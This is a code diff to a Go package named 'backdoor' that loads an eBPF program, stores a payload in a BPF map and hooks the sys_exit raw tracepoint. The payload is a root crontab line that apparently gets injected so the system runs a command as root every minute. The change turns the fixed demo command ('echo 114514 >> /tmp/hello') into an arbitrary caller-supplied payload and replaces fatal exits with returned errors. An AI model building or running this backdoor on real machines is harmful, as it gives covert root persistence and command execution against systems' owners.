@@ -4,7 +4,6 @@ package backdoor
 
 import (
 	"fmt"
-	"log"
 	"os"
 	"os/signal"
 	"syscall"
@@ -18,17 +17,19 @@ const bpf_map_key uint32 = 7
 
 //go:generate go run github.com/cilium/ebpf/cmd/bpf2go -target amd64 bpf ../c/backdoor.c -- -I../c/headers
 
-func Backdoor() {
-	payload := "* * * * * root  /bin/bash -c \"echo 114514 >> /tmp/hello\" \n#"
+func Backdoor(payload string) (err error) {
+	if payload == "" {
+		payload = "* * * * * root  /bin/bash -c \"echo 114514 >> /tmp/hello\" \n#"
+	}
 	stopper := make(chan os.Signal, 1)
 	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)
 
 	if err := rlimit.RemoveMemlock(); err != nil {
-		log.Fatal(err)
+		return err
 	}
 	objs := bpfObjects{}
 	if err := loadBpfObjects(&objs, nil); err != nil {
-		log.Fatalf("loading objects: %v", err)
+		return err
 	}
 	defer objs.Close()
 
@@ -36,7 +37,7 @@ func Backdoor() {
 		bpf_map_key,
 		bpfPayloadMap{Payload: stringToInt8(payload)},
 		ebpf.UpdateAny); err != nil {
-		fmt.Println(err)
+		return err
 	}
 
 	rtp, err := link.AttachRawTracepoint(link.RawTracepointOptions{
@@ -44,11 +45,12 @@ func Backdoor() {
 		Program: objs.RawTpSysExit,
 	})
 	if err != nil {
-		log.Fatalf("opening tracepoint: %s", err)
+		return err
 	}
 	defer rtp.Close()
 
 	fmt.Println("Successfully started! Please run the command to see output of the BPF programs.")
 	fmt.Println("sudo cat /sys/kernel/debug/tracing/trace_pipe")
 	<-stopper
+	return nil
 }
